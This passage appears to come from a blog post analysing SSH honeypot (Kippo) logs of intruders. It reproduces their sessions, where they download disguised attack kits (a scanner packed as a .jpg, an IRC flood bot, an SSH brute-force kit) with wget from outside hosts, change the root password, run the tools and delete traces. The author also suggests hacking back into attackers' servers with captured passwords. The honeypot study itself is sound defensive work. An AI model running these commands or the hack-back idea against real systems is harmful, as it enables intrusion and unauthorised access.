<span class="nv">E</span>: <span class="nv">Unable</span> <span class="nv">to</span> <span class="nv">lock</span> <span class="nv">the</span> <span class="nv">list</span> <span class="nv">directory</span>

<span class="nv">server</span>:<span class="o">~</span># <span class="nv">yum</span>
<span class="nv">bash</span>: <span class="nv">yum</span>: <span class="nv">command</span> <span class="nv">not</span> <span class="nv">found</span>

<span class="nv">server</span>:<span class="o">~</span># <span class="nv">wget</span>
<span class="nv">wget</span>: <span class="nv">missing</span> <span class="nv">URL</span>
<span class="nv">Usage</span>: <span class="nv">wget</span> [<span class="nv">OPTION</span>]... [<span class="nv">URL</span>]...

<span class="nv">Try</span> `<span class="nv">wget</span> <span class="o">--</span><span class="nv">help</span><span class="s1">&#39;</span><span class="s"> for more options.</span>

<span class="nv">server</span>:<span class="o">~</span># <span class="nv">http</span>:<span class="o">//</span><span class="nv">root</span><span class="o">-</span><span class="nv">arhive</span>.<span class="k">do</span>.<span class="nv">am</span><span class="o">/</span><span class="nv">scanner</span><span class="o">/</span><span class="nv">scanmorf</span>.<span class="nv">jpg</span> <span class="c1">; tar zxvf scanmorf.jpg ; cd .shm.xcgi?F6=1 ; chmod wget +x *</span>
<span class="o">--</span><span class="mi">2011</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">26</span> <span class="mi">23</span>:<span class="mi">53</span>:<span class="mi">38</span><span class="o">--</span>  <span class="nv">http</span>:<span class="o">//</span><span class="nv">root</span><span class="o">-</span><span class="nv">arhive</span>.<span class="k">do</span>.<span class="nv">am</span><span class="o">/</span><span class="nv">scanner</span><span class="o">/</span><span class="nv">scanmorf</span>.<span class="nv">jpg</span>
<span class="nv">Connecting</span> <span class="nv">to</span> <span class="nv">root</span><span class="o">-</span><span class="nv">arhive</span>.<span class="k">do</span>.<span class="nv">am</span>:<span class="mi">80</span>... <span class="nv">connected</span>.
<span class="nv">HTTP</span> <span class="nv">request</span> <span class="nv">sent</span>, <span class="nv">awaiting</span> <span class="nv">response</span>... <span class="mi">200</span> <span class="nv">OK</span>
<span class="nv">Length</span>: <span class="mi">12466</span> <span class="ss">(</span><span class="mi">12</span><span class="nv">K</span><span class="ss">)</span> [<span class="nv">image</span><span class="o">/</span><span class="nv">jpeg</span>]
<span class="nv">Saving</span> <span class="nv">to</span>: `<span class="nv">scanmorf</span>.<span class="nv">jpg</span>
<span class="mi">100</span><span class="o">%</span>[<span class="o">======================================&gt;</span>] <span class="mi">12</span>,<span class="mi">466</span>       <span class="mi">2</span><span class="nv">K</span><span class="o">/</span><span class="nv">s</span>  <span class="nv">eta</span> <span class="mi">4</span><span class="nv">s</span>

<span class="mi">2011</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">26</span> <span class="mi">23</span>:<span class="mi">53</span>:<span class="mi">38</span> <span class="ss">(</span><span class="mi">2</span> <span class="nv">KB</span><span class="o">/</span><span class="nv">s</span><span class="ss">)</span> <span class="o">-</span> `<span class="nv">scanmorf</span>.<span class="nv">jpg</span><span class="s1">&#39;</span><span class="s"> saved [12466/12466]</span>

.<span class="nv">shm</span>.<span class="nv">xcgi</span>?<span class="nv">F6</span><span class="o">=</span><span class="mi">1</span>
.<span class="nv">shm</span>.<span class="nv">xcgi</span>?<span class="nv">F6</span><span class="o">=</span><span class="mi">1</span><span class="o">/</span><span class="mi">12</span>.<span class="nv">pscan</span>.<span class="mi">80</span>
.<span class="nv">shm</span>.<span class="nv">xcgi</span>?<span class="nv">F6</span><span class="o">=</span><span class="mi">1</span><span class="o">/</span><span class="nv">Horde</span>
.<span class="nv">shm</span>.<span class="nv">xcgi</span>?<span class="nv">F6</span><span class="o">=</span><span class="mi">1</span><span class="o">/</span><span class="nv">sd</span>.<span class="nv">pscan</span>.<span class="mi">80</span>
.<span class="nv">shm</span>.<span class="nv">xcgi</span>?<span class="nv">F6</span><span class="o">=</span><span class="mi">1</span><span class="o">/</span><span class="nv">h</span>
.<span class="nv">shm</span>.<span class="nv">xcgi</span>?<span class="nv">F6</span><span class="o">=</span><span class="mi">1</span><span class="o">/</span><span class="nv">a</span>
.<span class="nv">shm</span>.<span class="nv">xcgi</span>?<span class="nv">F6</span><span class="o">=</span><span class="mi">1</span><span class="o">/</span><span class="mi">23</span>.<span class="nv">pscan</span>.<span class="mi">80</span>
.<span class="nv">shm</span>.<span class="nv">xcgi</span>?<span class="nv">F6</span><span class="o">=</span><span class="mi">1</span><span class="o">/</span><span class="nv">paths</span>
.<span class="nv">shm</span>.<span class="nv">xcgi</span>?<span class="nv">F6</span><span class="o">=</span><span class="mi">1</span><span class="o">/</span><span class="nv">ps</span>
.<span class="nv">shm</span>.<span class="nv">xcgi</span>?<span class="nv">F6</span><span class="o">=</span><span class="mi">1</span><span class="o">/</span><span class="nv">a</span>.<span class="nv">pl</span>
.<span class="nv">shm</span>.<span class="nv">xcgi</span>?<span class="nv">F6</span><span class="o">=</span><span class="mi">1</span><span class="o">/</span><span class="nv">scan</span>

<span class="nv">server</span>:<span class="o">/</span><span class="nv">root</span><span class="o">/</span>.<span class="nv">shm</span>.<span class="nv">xcgi</span>?<span class="nv">F6</span><span class="o">=</span><span class="mi">1</span># <span class="nv">ls</span>
<span class="mi">12</span>.<span class="nv">pscan</span>.<span class="mi">80</span> <span class="nv">Horde</span>       <span class="nv">sd</span>.<span class="nv">pscan</span>.<span class="mi">80</span> <span class="nv">h</span>           <span class="nv">a</span>           <span class="mi">23</span>.<span class="nv">pscan</span>.<span class="mi">80</span> <span class="nv">paths</span>       <span class="nv">ps</span>          <span class="nv">a</span>.<span class="nv">pl</span>        <span class="nv">scan</span>

<span class="nv">server</span>:<span class="o">/</span><span class="nv">root</span><span class="o">/</span>.<span class="nv">shm</span>.<span class="nv">xcgi</span>?<span class="nv">F6</span><span class="o">=</span><span class="mi">1</span># <span class="nv">ls</span> <span class="o">-</span><span class="nv">all</span>
<span class="nv">drwxr</span><span class="o">-</span><span class="nv">xr</span><span class="o">-</span><span class="nv">x</span> <span class="mi">1</span> <span class="nv">root</span> <span class="nv">root</span>  <span class="mi">4096</span> <span class="mi">2011</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">26</span> <span class="mi">23</span>:<span class="mi">53</span> .
<span class="nv">drwxr</span><span class="o">-</span><span class="nv">xr</span><span class="o">-</span><span class="nv">x</span> <span class="mi">1</span> <span class="nv">root</span> <span class="nv">root</span>  <span class="mi">4096</span> <span class="mi">2011</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">26</span> <span class="mi">23</span>:<span class="mi">53</span> ..
<span class="o">-</span><span class="nv">rwxr</span><span class="o">-</span><span class="nv">xr</span><span class="o">-</span><span class="nv">x</span> <span class="mi">1</span> <span class="nv">root</span> <span class="nv">root</span>     <span class="mi">0</span> <span class="mi">2011</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">22</span> <span class="mi">02</span>:<span class="mi">25</span> <span class="mi">12</span>.<span class="nv">pscan</span>.<span class="mi">80</span>
<span class="o">-</span><span class="nv">rwxr</span><span class="o">-</span><span class="nv">xr</span><span class="o">-</span><span class="nv">x</span> <span class="mi">1</span> <span class="nv">root</span> <span class="nv">root</span> <span class="mi">14372</span> <span class="mi">2011</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">22</span> <span class="mi">02</span>:<span class="mi">28</span> <span class="nv">Horde</span>
<span class="o">-</span><span class="nv">rwxr</span><span class="o">-</span><span class="nv">xr</span><span class="o">-</span><span class="nv">x</span> <span class="mi">1</span> <span class="nv">root</span> <span class="nv">root</span>  <span class="mi">9516</span> <span class="mi">2011</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">22</span> <span class="mi">02</span>:<span class="mi">25</span> <span class="nv">sd</span>.<span class="nv">pscan</span>.<span class="mi">80</span>
<span class="o">-</span><span class="nv">rwxr</span><span class="o">-</span><span class="nv">xr</span><span class="o">-</span><span class="nv">x</span> <span class="mi">1</span> <span class="nv">root</span> <span class="nv">root</span>  <span class="mi">2720</span> <span class="mi">2006</span><span class="o">-</span><span class="mi">05</span><span class="o">-</span><span class="mi">05</span> <span class="mi">15</span>:<span class="mi">56</span> <span class="nv">h</span>
<span class="o">-</span><span class="nv">rwxr</span><span class="o">-</span><span class="nv">xr</span><span class="o">-</span><span class="nv">x</span> <span class="mi">1</span> <span class="nv">root</span> <span class="nv">root</span>    <span class="mi">23</span> <span class="mi">2006</span><span class="o">-</span><span class="mi">05</span><span class="o">-</span><span class="mi">05</span> <span class="mi">15</span>:<span class="mi">55</span> <span class="nv">a</span>
<span class="o">-</span><span class="nv">rw</span><span class="o">-</span><span class="nv">r</span><span class="o">--</span><span class="nv">r</span><span class="o">--</span> <span class="mi">1</span> <span class="nv">root</span> <span class="nv">root</span>     <span class="mi">0</span> <span class="mi">2011</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">22</span> <span class="mi">02</span>:<span class="mi">28</span> <span class="mi">23</span>.<span class="nv">pscan</span>.<span class="mi">80</span>
<span class="o">-</span><span class="nv">rwxr</span><span class="o">-</span><span class="nv">xr</span><span class="o">-</span><span class="nv">x</span> <span class="mi">1</span> <span class="nv">root</span> <span class="nv">root</span>    <span class="mi">50</span> <span class="mi">2006</span><span class="o">-</span><span class="mi">05</span><span class="o">-</span><span class="mi">05</span> <span class="mi">15</span>:<span class="mi">56</span> <span class="nv">paths</span>
<span class="o">-</span><span class="nv">rwxr</span><span class="o">-</span><span class="nv">xr</span><span class="o">-</span><span class="nv">x</span> <span class="mi">1</span> <span class="nv">root</span> <span class="nv">root</span> <span class="mi">13432</span> <span class="mi">2011</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">22</span> <span class="mi">02</span>:<span class="mi">28</span> <span class="nv">ps</span>
<span class="o">-</span><span class="nv">rwxr</span><span class="o">-</span><span class="nv">xr</span><span class="o">-</span><span class="nv">x</span> <span class="mi">1</span> <span class="nv">root</span> <span class="nv">root</span>  <span class="mi">1165</span> <span class="mi">2006</span><span class="o">-</span><span class="mi">05</span><span class="o">-</span><span class="mi">05</span> <span class="mi">15</span>:<span class="mi">56</span> <span class="nv">a</span>.<span class="nv">pl</span>
<span class="o">-</span><span class="nv">rwxr</span><span class="o">-</span><span class="nv">xr</span><span class="o">-</span><span class="nv">x</span> <span class="mi">1</span> <span class="nv">root</span> <span class="nv">root</span>   <span class="mi">857</span> <span class="mi">2011</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">22</span> <span class="mi">02</span>:<span class="mi">28</span> <span class="nv">scan</span>

<span class="nv">server</span>:<span class="o">/</span><span class="nv">root</span><span class="o">/</span>.<span class="nv">shm</span>.<span class="nv">xcgi</span>?<span class="nv">F6</span><span class="o">=</span><span class="mi">1</span># .<span class="o">/</span><span class="nv">scan</span> <span class="mi">88</span>.<span class="mi">198</span>
  <span class="nv">___</span>
 {<span class="nv">o</span>,<span class="nv">o</span>}
 <span class="o">|</span><span class="ss">)</span><span class="nv">__</span><span class="ss">)</span>
 <span class="o">-</span><span class="s2">&quot;</span><span class="s">-</span><span class="s2">&quot;</span><span class="o">-</span>
<span class="nv">O</span> <span class="nv">RLY</span>? <span class="nv">y</span>
  <span class="nv">___</span>
 {<span class="nv">o</span>,<span class="nv">o</span>}
 <span class="ss">(</span><span class="nv">__</span><span class="ss">(</span><span class="o">|</span>
 <span class="o">-</span><span class="s2">&quot;</span><span class="s">-</span><span class="s2">&quot;</span><span class="o">-</span>
<span class="nv">NO</span> <span class="nv">WAI</span><span class="o">!</span>

<span class="nv">server</span>:<span class="o">/</span><span class="nv">root</span><span class="o">/</span>.<span class="nv">shm</span>.<span class="nv">xcgi</span>?<span class="nv">F6</span><span class="o">=</span><span class="mi">1</span># .<span class="o">/</span><span class="nv">a</span> <span class="mi">88</span>.<span class="mi">198</span>
<span class="nv">error</span> <span class="k">while</span> <span class="nv">loading</span> <span class="nv">shared</span> <span class="nv">libraries</span>: <span class="nv">libgnome</span>.<span class="nv">so</span>.<span class="mi">32</span>: <span class="nv">cannot</span> <span class="nv">open</span> <span class="nv">shared</span> <span class="nv">object</span> <span class="nv">file</span>: <span class="nv">No</span> <span class="nv">such</span> <span class="nv">file</span> <span class="nv">or</span> <span class="nv">directory</span>
</pre></div>


<h2>Third&nbsp;example</h2>
<p>Some intruders are friendly enough to change the root password for us. This would actually be an interesting concept to add to Kippo: when you notice a <code>passwd</code> command being executed, try to set up a reverse <span class="caps">SSH</span> connection to the attacker (probably possible since the attackers often use hacked servers themselves) and login with that password. When the same password is used during each hack attempt, we would probably be able to reclaim the originating server. Two tools are downloaded here. One is a flooding <span class="caps">IRC</span> bot, the other is a rehash of the <code>pscan</code> tool from above, with some automation shell scripts added (dubbed <code>gosh</code> here). It&#8217;s also interesting to note that most of the hackers try to cover their tracks by removing their&nbsp;downloads.</p>
<div class="highlight"><pre><span></span><span class="nl">server</span><span class="p">:</span><span class="o">~</span><span class="err">#</span><span class="w"> </span><span class="n">w</span><span class="w"></span>
<span class="w"> </span><span class="mi">23</span><span class="err">:</span><span class="mi">35</span><span class="err">:</span><span class="mi">44</span><span class="w"> </span><span class="n">up</span><span class="w"> </span><span class="mi">14</span><span class="w"> </span><span class="n">days</span><span class="p">,</span><span class="w">  </span><span class="mi">3</span><span class="err">:</span><span class="mi">53</span><span class="p">,</span><span class="w">  </span><span class="mi">1</span><span class="w"> </span><span class="k">user</span><span class="p">,</span><span class="w">  </span><span class="k">load</span><span class="w"> </span><span class="nl">average</span><span class="p">:</span><span class="w"> </span><span class="mf">0.08</span><span class="p">,</span><span class="w"> </span><span class="mf">0.02</span><span class="p">,</span><span class="w"> </span><span class="mf">0.01</span><span class="w"></span>
<span class="k">USER</span><span class="w">     </span><span class="n">TTY</span><span class="w">      </span><span class="k">FROM</span><span class="w">              </span><span class="n">LOGIN</span><span class="err">@</span><span class="w">   </span><span class="n">IDLE</span><span class="w">   </span><span class="n">JCPU</span><span class="w">   </span><span class="n">PCPU</span><span class="w"> </span><span class="n">WHAT</span><span class="w"></span>
<span class="n">root</span><span class="w">     </span><span class="n">pts</span><span class="o">/</span><span class="mi">0</span><span class="w">    </span><span class="mf">82.57.163.232</span><span class="w">     </span><span class="mi">23</span><span class="err">:</span><span class="mi">35</span><span class="w">    </span><span class="mf">0.00</span><span class="n">s</span><span class="w">  </span><span class="mf">0.00</span><span class="n">s</span><span class="w">  </span><span class="mf">0.00</span><span class="n">s</span><span class="w"> </span><span class="n">w</span><span class="w"></span>

<span class="nl">server</span><span class="p">:</span><span class="o">~</span><span class="err">#</span><span class="w"> </span><span class="n">passwd</span><span class="w"></span>
<span class="n">Enter</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">UNIX</span><span class="w"> </span><span class="nl">password</span><span class="p">:</span><span class="w"></span>
<span class="n">Retype</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">UNIX</span><span class="w"> </span><span class="nl">password</span><span class="p">:</span><span class="w"></span>
<span class="nl">passwd</span><span class="p">:</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="n">updated</span><span class="w"> </span><span class="n">successfully</span><span class="w"></span>

<span class="nl">server</span><span class="p">:</span><span class="o">~</span><span class="err">#</span><span class="w"> </span><span class="n">cd</span><span class="w"> </span><span class="p">..</span><span class="w"></span>

<span class="nl">server</span><span class="p">:</span><span class="o">/</span><span class="err">#</span><span class="w"> </span><span class="n">cd</span><span class="w"> </span><span class="nf">var</span><span class="w"></span>

<span class="nl">server</span><span class="p">:</span><span class="o">/</span><span class="nf">var</span><span class="err">#</span><span class="w"> </span><span class="n">cd</span><span class="w"> </span><span class="n">tmp</span><span class="w"></span>

<span class="nl">server</span><span class="p">:</span><span class="o">/</span><span class="nf">var</span><span class="o">/</span><span class="n">tmp</span><span class="err">#</span><span class="w"> </span><span class="n">ls</span><span class="w"></span>

<span class="nl">server</span><span class="p">:</span><span class="o">/</span><span class="nf">var</span><span class="o">/</span><span class="n">tmp</span><span class="err">#</span><span class="w"> </span><span class="n">wget</span><span class="w"> </span><span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="p">.</span><span class="n">denysa</span><span class="p">.</span><span class="n">net</span><span class="o">/</span><span class="n">denysa</span><span class="o">/</span><span class="n">flood</span><span class="p">.</span><span class="n">tgz</span><span class="w"></span>
<span class="c1">--2011-01-26 23:36:24--  http://www.denysa.net/denysa/flood.tgz</span>
<span class="n">Connecting</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">www</span><span class="p">.</span><span class="n">denysa</span><span class="p">.</span><span class="nl">net</span><span class="p">:</span><span class="mf">80.</span><span class="p">..</span><span class="w"> </span><span class="n">connected</span><span class="p">.</span><span class="w"></span>
<span class="n">HTTP</span><span class="w"> </span><span class="n">request</span><span class="w"> </span><span class="n">sent</span><span class="p">,</span><span class="w"> </span><span class="n">awaiting</span><span class="w"> </span><span class="n">response</span><span class="p">...</span><span class="w"> </span><span class="mi">200</span><span class="w"> </span><span class="n">OK</span><span class="w"></span>
<span class="nl">Length</span><span class="p">:</span><span class="w"> </span><span class="mi">227324</span><span class="w"> </span><span class="p">(</span><span class="mi">221</span><span class="n">K</span><span class="p">)</span><span class="w"> </span><span class="o">[</span><span class="n">application/x-compressed</span><span class="o">]</span><span class="w"></span>
<span class="n">Saving</span><span class="w"> </span><span class="k">to</span><span class="err">:</span><span class="w"> </span><span class="err">`</span><span class="n">flood</span><span class="p">.</span><span class="n">tgz</span><span class="w"></span>

<span class="mi">100</span><span class="o">%[</span><span class="n">======================================&gt;</span><span class="o">]</span><span class="w"> </span><span class="mi">227</span><span class="p">,</span><span class="mi">324</span><span class="w">      </span><span class="mi">51</span><span class="n">K</span><span class="o">/</span><span class="n">s</span><span class="w">  </span><span class="n">eta</span><span class="w"> </span><span class="mi">2</span><span class="n">s</span><span class="w"></span>

<span class="mi">2011</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">26</span><span class="w"> </span><span class="mi">23</span><span class="err">:</span><span class="mi">36</span><span class="err">:</span><span class="mi">26</span><span class="w"> </span><span class="p">(</span><span class="mi">51</span><span class="w"> </span><span class="n">KB</span><span class="o">/</span><span class="n">s</span><span class="p">)</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="err">`</span><span class="n">flood</span><span class="p">.</span><span class="n">tgz</span><span class="s1">&#39; saved [227324/227324]</span>

<span class="s1">server:/var/tmp# wget http://gblteam.webs.com/gosh.tgz.tar</span>
<span class="s1">--2011-01-26 23:36:44--  http://gblteam.webs.com/gosh.tgz.tar</span>
<span class="s1">Connecting to gblteam.webs.com:80... connected.</span>
<span class="s1">HTTP request sent, awaiting response... 200 OK</span>
<span class="s1">Length: 1642769 (1M) [application/x-tar]</span>
<span class="s1">Saving to: `gosh.tgz.tar</span>

<span class="s1">100%[======================================&gt;] 1,642,769    658K/s  eta 0s</span>

<span class="s1">2011-01-26 23:36:46 (658 KB/s) - `gosh.tgz.tar&#39;</span><span class="w"> </span><span class="n">saved</span><span class="w"> </span><span class="o">[</span><span class="n">1642769/1642769</span><span class="o">]</span><span class="w"></span>

<span class="nl">server</span><span class="p">:</span><span class="o">/</span><span class="nf">var</span><span class="o">/</span><span class="n">tmp</span><span class="err">#</span><span class="w"> </span><span class="n">tar</span><span class="w"> </span><span class="n">zxvf</span><span class="w"> </span><span class="n">gosh</span><span class="p">.</span><span class="n">tgz</span><span class="p">.</span><span class="n">tar</span><span class="w"></span>
<span class="n">gosh</span><span class="w"></span>
<span class="n">gosh</span><span class="o">/</span><span class="mi">3</span><span class="w"></span>
<span class="n">gosh</span><span class="o">/</span><span class="mi">4</span><span class="w"></span>
<span class="n">gosh</span><span class="o">/</span><span class="n">common</span><span class="w"></span>
<span class="n">gosh</span><span class="o">/</span><span class="k">go</span><span class="p">.</span><span class="n">sh</span><span class="w"></span>
<span class="n">gosh</span><span class="o">/</span><span class="n">scam</span><span class="w"></span>
<span class="n">gosh</span><span class="o">/</span><span class="n">pscan2</span><span class="w"></span>
<span class="n">gosh</span><span class="o">/</span><span class="n">ss</span><span class="w"></span>
<span class="n">gosh</span><span class="o">/</span><span class="mi">5</span><span class="w"></span>
<span class="n">gosh</span><span class="o">/</span><span class="n">vuln</span><span class="p">.</span><span class="n">txt</span><span class="w"></span>
<span class="n">gosh</span><span class="o">/</span><span class="mi">1</span><span class="w"></span>
<span class="n">gosh</span><span class="o">/</span><span class="n">mfu</span><span class="p">.</span><span class="n">txt</span><span class="w"></span>
<span class="n">gosh</span><span class="o">/</span><span class="n">pass_file</span><span class="w"></span>
<span class="n">gosh</span><span class="o">/</span><span class="n">gen</span><span class="o">-</span><span class="n">pass</span><span class="p">.</span><span class="n">sh</span><span class="w"></span>
<span class="n">gosh</span><span class="o">/</span><span class="n">secure</span><span class="w"></span>
<span class="n">gosh</span><span class="o">/</span><span class="mi">2</span><span class="w"></span>
<span class="n">gosh</span><span class="o">/</span><span class="n">ssh</span><span class="o">-</span><span class="n">scan</span><span class="w"></span>
<span class="n">gosh</span><span class="o">/</span><span class="n">a</span><span class="w"></span>

<span class="nl">server</span><span class="p">:</span><span class="o">/</span><span class="nf">var</span><span class="o">/</span><span class="n">tmp</span><span class="err">#</span><span class="w"> </span><span class="n">cd</span><span class="w"> </span><span class="n">gosh</span><span class="w"></span>

<span class="nl">server</span><span class="p">:</span><span class="o">/</span><span class="nf">var</span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">gosh</span><span class="err">#</span><span class="w"> </span><span class="n">ls</span><span class="w"></span>
<span class="mi">3</span><span class="w">           </span><span class="mi">4</span><span class="w">           </span><span class="n">common</span><span class="w">      </span><span class="k">go</span><span class="p">.</span><span class="n">sh</span><span class="w">       </span><span class="n">scam</span><span class="w">        </span><span class="n">pscan2</span><span class="w"></span>
<span class="n">ss</span><span class="w">          </span><span class="mi">5</span><span class="w">           </span><span class="n">vuln</span><span class="p">.</span><span class="n">txt</span><span class="w">    </span><span class="mi">1</span><span class="w">           </span><span class="n">mfu</span><span class="p">.</span><span class="n">txt</span><span class="w">     </span><span class="n">pass_file</span><span class="w"></span>
<span class="n">gen</span><span class="o">-</span><span class="n">pass</span><span class="p">.</span><span class="n">sh</span><span class="w"> </span><span class="n">secure</span><span class="w">      </span><span class="mi">2</span><span class="w">           </span><span class="n">ssh</span><span class="o">-</span><span class="n">scan</span><span class="w">    </span><span class="n">a</span><span class="w"></span>

<span class="nl">server</span><span class="p">:</span><span class="o">/</span><span class="nf">var</span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">gosh</span><span class="err">#</span><span class="w"> </span><span class="n">touch</span><span class="w"> </span><span class="n">bios</span><span class="p">.</span><span class="n">txt</span><span class="w"></span>

<span class="nl">server</span><span class="p">:</span><span class="o">/</span><span class="nf">var</span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">gosh</span><span class="err">#</span><span class="w"> </span><span class="n">chmod</span><span class="w"> </span><span class="o">+</span><span class="n">x</span><span class="w"> </span><span class="o">*</span><span class="w"></span>

<span class="nl">server</span><span class="p">:</span><span class="o">/</span><span class="nf">var</span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">gosh</span><span class="err">#</span><span class="w"> </span><span class="p">.</span><span class="o">/</span><span class="k">go</span><span class="p">.</span><span class="n">sh</span><span class="w"> </span><span class="mi">114</span><span class="w"></span>
<span class="w">  </span><span class="n">___</span><span class="w"></span>
<span class="w"> </span><span class="err">{</span><span class="n">o</span><span class="p">,</span><span class="n">o</span><span class="err">}</span><span class="w"></span>
<span class="w"> </span><span class="o">|</span><span class="p">)</span><span class="n">__</span><span class="p">)</span><span class="w"></span>
<span class="w"> </span><span class="o">-</span><span class="ss">&quot;-&quot;</span><span class="o">-</span><span class="w"></span>
<span class="n">O</span><span class="w"> </span><span class="n">RLY</span><span class="vm">?</span><span class="w"> </span><span class="n">y</span><span class="w"></span>

<span class="w">  </span><span class="n">___</span><span class="w"></span>
<span class="w"> </span><span class="err">{</span><span class="n">o</span><span class="p">,</span><span class="n">o</span><span class="err">}</span><span class="w"></span>
<span class="w"> </span><span class="p">(</span><span class="n">__</span><span class="p">(</span><span class="o">|</span><span class="w"></span>
<span class="w"> </span><span class="o">-</span><span class="ss">&quot;-&quot;</span><span class="o">-</span><span class="w"></span>
<span class="k">NO</span><span class="w"> </span><span class="n">WAI</span><span class="err">!</span><span class="w"></span>

<span class="nl">server</span><span class="p">:</span><span class="o">/</span><span class="nf">var</span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">gosh</span><span class="err">#</span><span class="w"> </span><span class="n">cd</span><span class="w"> </span><span class="p">..</span><span class="w"></span>

<span class="nl">server</span><span class="p">:</span><span class="o">/</span><span class="nf">var</span><span class="o">/</span><span class="n">tmp</span><span class="err">#</span><span class="w"> </span><span class="n">rm</span><span class="w"> </span><span class="o">-</span><span class="n">rf</span><span class="w"> </span><span class="n">gosh</span><span class="w"></span>

<span class="nl">server</span><span class="p">:</span><span class="o">/</span><span class="nf">var</span><span class="o">/</span><span class="n">tmp</span><span class="err">#</span><span class="w"> </span><span class="n">ls</span><span class="w"></span>
<span class="n">flood</span><span class="p">.</span><span class="n">tgz</span><span class="w">    </span><span class="n">gosh</span><span class="p">.</span><span class="n">tgz</span><span class="p">.</span><span class="n">tar</span><span class="w"></span>

<span class="nl">server</span><span class="p">:</span><span class="o">/</span><span class="nf">var</span><span class="o">/</span><span class="n">tmp</span><span class="err">#</span><span class="w"> </span><span class="n">tar</span><span class="w"> </span><span class="n">zxvf</span><span class="w"> </span><span class="n">flood</span><span class="p">.</span><span class="n">tgz</span><span class="w"></span>
<span class="n">f</span><span class="w"></span>
<span class="n">f</span><span class="o">/</span><span class="mi">1</span><span class="w"></span>
<span class="n">f</span><span class="o">/</span><span class="n">P</span><span class="o">&amp;</span><span class="n">uÃ</span><span class="err">·</span><span class="w"></span>
<span class="n">f</span><span class="o">/</span><span class="n">PÂ</span><span class="err">¦</span><span class="n">uÃ</span><span class="err">·</span><span class="w"></span>
<span class="n">f</span><span class="o">/</span><span class="n">b</span><span class="w"></span>
<span class="n">f</span><span class="o">/</span><span class="n">b2</span><span class="w"></span>
<span class="n">f</span><span class="o">/</span><span class="n">bang</span><span class="p">.</span><span class="n">txt</span><span class="w"></span>
<span class="n">f</span><span class="o">/</span><span class="n">f</span><span class="w"></span>
<span class="n">f</span><span class="o">/</span><span class="n">f4</span><span class="w"></span>
<span class="n">f</span><span class="o">/</span><span class="n">fwd</span><span class="w"></span>
<span class="n">f</span><span class="o">/</span><span class="n">hide</span><span class="w"></span>
<span class="n">f</span><span class="o">/</span><span class="n">httpd</span><span class="w"></span>
<span class="n">f</span><span class="o">/</span><span class="n">j</span><span class="w"></span>
<span class="n">f</span><span class="o">/</span><span class="n">j2</span><span class="w"></span>
<span class="n">f</span><span class="o">/</span><span class="n">mech</span><span class="p">.</span><span class="n">help</span><span class="w"></span>
<span class="n">f</span><span class="o">/</span><span class="n">mech</span><span class="p">.</span><span class="k">set</span><span class="w"></span>
<span class="n">f</span><span class="o">/</span><span class="n">s</span><span class="w"></span>
<span class="n">f</span><span class="o">/</span><span class="n">sl</span><span class="w"></span>
<span class="n">f</span><span class="o">/</span><span class="k">start</span><span class="p">.</span><span class="n">sh</span><span class="w"></span>
<span class="n">f</span><span class="o">/</span><span class="n">std</span><span class="w"></span>
<span class="n">f</span><span class="o">/</span><span class="n">stream</span><span class="w"></span>
<span class="n">f</span><span class="o">/</span><span class="n">tty</span><span class="w"></span>
<span class="n">f</span><span class="o">/</span><span class="n">v</span><span class="w"></span>
<span class="n">f</span><span class="o">/</span><span class="n">v2</span><span class="w"></span>
<span class="n">f</span><span class="o">/</span><span class="n">x</span><span class="w"></span>

<span class="nl">server</span><span class="p">:</span><span class="o">/</span><span class="nf">var</span><span class="o">/</span><span class="n">tmp</span><span class="err">#</span><span class="w"> </span><span class="n">cd</span><span class="w"> </span><span class="n">f</span><span class="w"></span>

<span class="nl">server</span><span class="p">:</span><span class="o">/</span><span class="nf">var</span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">f</span><span class="err">#</span><span class="w"> </span><span class="n">rm</span><span class="w"> </span><span class="o">-</span><span class="n">rf</span><span class="w"> </span><span class="n">f</span><span class="w"></span>

<span class="nl">server</span><span class="p">:</span><span class="o">/</span><span class="nf">var</span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">f</span><span class="err">#</span><span class="w"> </span><span class="n">ls</span><span class="w"></span>
<span class="mi">1</span><span class="w">         </span><span class="n">P</span><span class="o">&amp;</span><span class="n">uÃ</span><span class="err">·</span><span class="w">   </span><span class="n">PÂ</span><span class="err">¦</span><span class="n">uÃ</span><span class="err">·</span><span class="w">  </span><span class="n">b</span><span class="w">         </span><span class="n">b2</span><span class="w">        </span><span class="n">bang</span><span class="p">.</span><span class="n">txt</span><span class="w">  </span><span class="n">f4</span><span class="w">        </span><span class="n">fwd</span><span class="w"></span>
<span class="n">hide</span><span class="w">      </span><span class="n">httpd</span><span class="w">     </span><span class="n">j</span><span class="w">         </span><span class="n">j2</span><span class="w">        </span><span class="n">mech</span><span class="p">.</span><span class="n">help</span><span class="w"> </span><span class="n">mech</span><span class="p">.</span><span class="k">set</span><span class="w">  </span><span class="n">s</span><span class="w">         </span><span class="n">sl</span><span class="w"></span>
<span class="k">start</span><span class="p">.</span><span class="n">sh</span><span class="w">  </span><span class="n">std</span><span class="w">       </span><span class="n">stream</span><span class="w">    </span><span class="n">tty</span><span class="w">       </span><span class="n">v</span><span class="w">         </span><span class="n">v2</span><span class="w">        </span><span class="n">x</span><span class="w"></span>

